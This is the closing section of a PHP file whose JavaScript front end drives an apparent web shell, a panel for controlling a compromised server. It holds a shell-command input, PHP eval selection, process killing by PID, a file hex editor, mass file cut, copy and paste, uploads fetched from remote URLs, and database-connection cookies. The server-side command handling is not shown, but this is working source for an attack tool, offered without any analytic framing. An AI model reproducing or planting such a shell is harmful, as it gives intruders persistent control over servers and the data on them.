		if(x[i].addEventListener) x[i].addEventListener ("click", function(event){go(this.href,event);event.preventDefault();return false;},false);
		else x[i].attachEvent ("onclick", function(event){return go(this.href,event);event.preventDefault();return false;});
	}
}
function go(t,evt){
	if(evt.which === 3 || evt.button === 2) return false;

	var z = d.getElementsByName('g');
	if(z){
		var y = z.item(this);
		for(var i = 0; i<y.length; i++){
			y[i].remove();
		}
	}

	t = decodeURI(t);
	ts = t.split('?');

	if(is_array(ts) && ts.length >= 2){
		var a = ts[0]
		var v = ts[1];

		if(ts.length==3){
			a = ts[0]+'?'+ts[1]+'?';
			v = ts[2];
		}

		var vs = v.split('&');
		var g = d.forms['g'];

		if(a=='') a='?';
		g.action = a;

		if(is_array(vs)){
			for(var i = 0; i<vs.length; i++){
				var e = vs[i].indexOf('=');
				if(e>=0) addinput(g, vs[i].slice(0,e), vs[i].slice(e+1));
				else addinput(g, vs[0], '');
			}
		}
		else{
			var e = vs.indexOf('=');
			if(e>=0) addinput(g, vs.slice(0,e), vs.slice(e+1));
			else addinput(g, vs, '');
		}
		g.submit();
	}
	else window.location = t;
	return false;
}
function tukar_(l,b){
	if(d.getElementById(l)) d.getElementById(l).style.display = 'none';
	if(d.getElementById(b)) d.getElementById(b).style.display = 'block';
	if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();
}
function toggle(b){
	if(d.getElementById(b)){
		if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';
		else d.getElementById(b).style.display = 'block'
	}
}
function tukar(id,cd,x,v,o){
	if(!o) o = '';
	a = d.getElementById(id);
	b = d.getElementById(id+'_form');
	c = '<?php echo adds($s_self); ?>';
	if(cd=='') cd = cwd;
	if(a && b){
		var i = d.createElement('form');
		i.action = c;
		i.method = 'post';

		if(o!='') addinput(i,'oldname',o);

		addinput(i,'cd',cd);
		addinput(i,x,v,'text','width:80px;','','inputz');
		addinput(i,'','Go !','submit','width:32px;','','inputzbut');
		addinput(i,'','x','button','',id,'inputzbut');
		b.appendChild(i);
		a.style.display = 'none';
	}
}
function addinput(f,n,v,t,s,c,cl){
	if(!t) t ='hidden';
	var i = d.createElement('input');
	if(n) i.name = n;
	if(v) i.value = v;
	if(t) i.type = t;
	if(s) i.style.cssText = s;
	if(c) i.onclick = function(){
		a = d.getElementById(c);
		b = d.getElementById(c+'_form');
		a.style.display = 'block';
		b.innerHTML = '';
	};
	if(cl) i.className = cl;
	f.appendChild(i);
}
function clickcmd(){
	var buff = d.getElementById('cmd');
	if(buff.value == '- shell command -') buff.value = '';
}
function download(what){
	what.form.submit();
	what.selectedIndex=0;
}
function hexfix(t,ev){
	var r = d.getElementById('hex_'+t);
	var q = d.getElementById('dump_'+t);
	var curpos = getcurpos(r);

	if(ev.keyCode==13 || ev.keyCode==46 || ev.keyCode==8 || ev.keyCode==32)	return false;

	if(ev.keyCode==40){
		var s = d.getElementById('hex_'+(parseInt(t)+1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
	if(ev.keyCode==38){
		var s = d.getElementById('hex_'+(parseInt(t)-1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
}
function showhex(){
	var counter = parseInt(d.getElementById('counter').value);
	for(var i = 0; i<counter; i++) hexupdate(i);
}
function hexupdate(t,ev){
	var r = d.getElementById('hex_'+t);
	var s = d.getElementById('dump_'+t);
	var a = '0123456789ABCDEF';
	var hexs = r.value;
	var hex = hexs.replace(/\s+/ig,'');
	var curpos = 0;

	clearpos();

	if(ev){
		curpos = getcurpos(r);
		var k = String.fromCharCode(ev.keyCode);
		if(curpos%3!=2){
			if(a.indexOf(k)>=0 && curpos<hexs.length){
				chr = hexs.substr(curpos,1);
				before = (curpos>=1)?  hexs.substr(0,curpos):'';
				after = (curpos<hexs.length)? hexs.substr(curpos+1):'';
				r.value = before + k + after;
				setcurpos(r, curpos+1, curpos+1);
			}
		}
	}

	if(r && s){
		var str = '';
		hexs = r.value;
		hex = hexs.replace(/\s+/ig,'');
		for(var i = 0; i<hex.length; i+=2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));

		str = str.replace(/[^\x21-\x7E]/ig,'.');
		str = str.replace(/</ig,'.');
		str = str.replace(/>/ig,'.');

		dmppos = Math.floor(curpos/3);
		chr = str.substr(dmppos,1);
		before = (dmppos>=1)? str.substr(0,dmppos):'';
		after = (dmppos<str.length)? str.substr(dmppos+1):'';
		s.innerHTML = before + "<span class='gaya' style='background:#000;font-weight:bold;border-bottom:1px solid #fff;border-top:1px solid #fff;'>" + chr + "</span>" + after;
	}
}
function submithex(){
	if(!hexstatus){
		hexstatus=true;
		var hexstr = '';
		var counter = parseInt(d.getElementById('counter').value);
		for(var i = 0; i<counter; i++){
			var hex = d.getElementById('hex_'+i);
			hexstr += hex.value;
			hex.remove();
		}
		hexstr = hexstr.replace(/\s+/g,'');
		var hexestxtarea = d.getElementById('hexestxtarea');
		hexestxtarea.innerHTML = hexstr;
		hexestxtarea.form.submit();
	}
}
function evalselect(e){
	var a = d.getElementById('additionaloption');
	var b = d.getElementById('evaloption');

	if(a){
		if(e.value=='php') a.className='sembunyi';
		else a.className='';
		if(b) evaloption.value ='';
	}
}
function getcurpos(c){
    var p = 0;

    if(d.selection){
        c.focus ();
        var sel = d.selection.createRange();
        sel.moveStart ('character', c.value.length);
        p = sel.text.length;
    }
    else if(c.selectionStart || c.selectionStart == '0')
        p = c.selectionStart;
    return p;
}
function setcurpos(c,p1,p2){
	if(c.setSelectionRange){
		c.focus(); c.setSelectionRange(p1,p2);
	}
	else if(c.createTextRange){
		var r = c.createTextRange();
		r.collapse(true);
		r.moveStart('character', p1);
		r.moveEnd('character', p2);
		r.select();
	}
}
function clearpos(){
	var a = d.getElementsByName('hexdump');
	for(var i = 0; i<a.length; i++)	a[i].innerHTML = a[i].innerHTML.replace(/<[^>]+>/ig,'');
}
function findtype(ty){
	var z = d.getElementById('type');
	if(z && (ty=='sdir')) z.selectedIndex = 1;
	else if(z && (ty=='sfile')) z.selectedIndex = 0;
}
function checkall(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementsByName('abox');
	var z = '<?php if(isset($_GP['x']) && ($_GP['x']=='ps')) echo "ps"; ?>';

	for(var i = 0; i<a.length; i++){
		if(a[i].checked || (z=='ps') || (i!=0) && (i!=1)){
			a[i].checked = b[0].checked;
		}
		var c = a[i].parentElement.parentElement;
		if(a[i].checked) c.className = 'cbox_selected';
		else c.className = '';
	}
	total_selected();
}
function hilite(el){
	var c = el.parentElement.parentElement;
	if(el.checked) c.className = 'cbox_selected';
	else c.className = '';
	total_selected();
}
function total_selected(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementById('total_selected');
	var c = 0;
	for(var i = 0;i<a.length;i++)	if(a[i].checked) c++;
	if(c==0) b.innerHTML = '';
	else b.innerHTML = ' ( selected : '+c+' items )';
}
function massactgo(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementById('massact');
	var c = d.getElementsByName('abox');
	var buffer = '';

	if(b.value=='cut' || b.value=='copy'){
		d.cookie='massact='+b.value+';';
		for(var i = 0; i<a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
	}
	else if(b.value=='paste'){
		addinput(b.form,'y','paste');
		b.form.submit();
	}
	else{
		for(var i = 0; i<a.length; i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
		addinput(b.form,'y', b.value);
		b.form.submit();
	}
	for(var i = 0; i<a.length; i++){
		a[i].checked = false;
		a[i].parentElement.parentElement.className='';
	}
	c[0].checked = false;
}
function pkill(){
	var a = d.getElementsByName('cbox');
	var c = d.getElementsByName('abox');
	var buffer = '';

	for(var i = 0; i<a.length; i++) if(a[i].checked) buffer += a[i].value+'|';

	if(buffer!=''){
		addinput(c[0].form,'x', 'ps');
		addinput(c[0].form,'pid', buffer);
		c[0].form.submit();
	}

	for(var i = 0; i<a.length; i++){
		a[i].checked = false;
		a[i].parentElement.parentElement.className='';
	}
	c[0].checked = false;
}
function dc(id){
	d.cookie = dbcon[id] + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}
function totop(){
	if(!scroll){
		var dur = window.pageYOffset;
		scroll = true;
		scrollto(0, dur);
	}
}
function totopd(){
	d.body.scrollTop = d.documentElement.scrollTop = 0;
	stopscroll();
}
function tobottom(){
	if(!scroll){
		var dur = getheight()-window.pageYOffset;
		scroll = true;
		scrollto(getheight(), dur);
	}
}
function tobottomd(){
	d.body.scrollTop = d.documentElement.scrollTop = getheight();
	stopscroll();
}
function stopscroll(){
	scroll = false;
	clearTimeout(timer);
}
function scrollto(to, dur) {
    var start = d.documentElement.scrollTop + d.body.scrollTop, change = to - start, cur = 0, inc = 20;
    var anim = function(){
		if(scroll){
			cur += inc;
			var val = easing(cur, start, change, dur);
			d.body.scrollTop = d.documentElement.scrollTop = val;
			if(cur < dur) {
				if(scroll) timer = setTimeout(anim, inc);
			}
			else stopscroll();
		}
    };
    anim();
}
function easing(t,b,c,e){
	return -c * Math.cos(t/e * (Math.PI/2)) + c + b;
}
function getheight(){
	return Math.max(
		d.body.scrollHeight, d.documentElement.scrollHeight,
		d.body.offsetHeight, d.documentElement.offsetHeight,
		d.body.clientHeight, d.documentElement.clientHeight
	);
}
function adduploadc(){
	var form = "<tr><td colspan='2'><hr /></td></tr><tr><td style='width:140px;'>File</td><td><input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /></td></tr><tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='"+cwd+"' /></td></tr><tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /></td></tr>";
	var a = d.getElementById('adduploadc');
	if(a) a.insertAdjacentHTML('beforeend', form);
}
function adduploadi(){
	var form = "<tr><td colspan='2'><hr /></td></tr><tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' /></td></tr><tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='"+cwd+"' /></td></tr><tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /></td></tr>";
	var a = d.getElementById('adduploadi');
	if(a) a.insertAdjacentHTML('beforeend', form);
}
</script>
</body>
</html><?php die(); ?>